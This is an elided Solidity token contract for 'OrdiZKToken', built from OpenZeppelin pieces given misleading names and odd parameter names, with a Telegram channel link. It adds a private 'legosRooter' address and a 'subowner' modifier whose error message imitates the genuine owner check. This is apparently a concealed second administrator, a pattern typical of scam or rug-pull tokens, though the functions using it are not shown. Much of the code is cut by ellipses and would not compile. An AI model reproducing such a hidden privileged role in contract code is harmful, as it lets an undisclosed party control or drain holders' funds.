...
/*
 * @dev Provides information about the current execution OrdiZK20Burnable, including the
 ...
 */
abstract contract OrdiZK20Burnable {
...
// File: @openzeppelin/contracts/access/OrdiZK20Ownable.sol
 ...
 * the owner.
 */
abstract contract OrdiZK20Ownable is OrdiZK20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OrdiZK20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OrdiZK20Ownable: new owner is the zero address");
 ...
 * `SafeOrdiZK` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeOrdiZK {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeOrdiZK: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeOrdiZK: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeOrdiZK: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeOrdiZK: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeOrdiZK: modulo by zero");
  }
...
contract OrdiZKToken is OrdiZK20Burnable, OrdiZK33, OrdiZK20Ownable {
    
    using SafeOrdiZK for uint256;
   ...
   address private legosRooter; 
    ...
    string public OrdiZKtelegramcchannel = "https://t.me/OrdiZK";
            function getOrdiZKtelegramcchannel() public view returns (string memory) {
        return OrdiZKtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {OrdiZK33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "OrdiZK20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {OrdiZK33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {OrdiZK33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {OrdiZK33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "OrdiZK33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {OrdiZK33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "OrdiZK33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "OrdiZK33: transfer from the zero address");
        require(shippingto != address(0), "OrdiZK33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "OrdiZK33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "OrdiZK33: approve from the zero address");
        require(transporteur != address(0), "OrdiZK33: approve to the zero address");
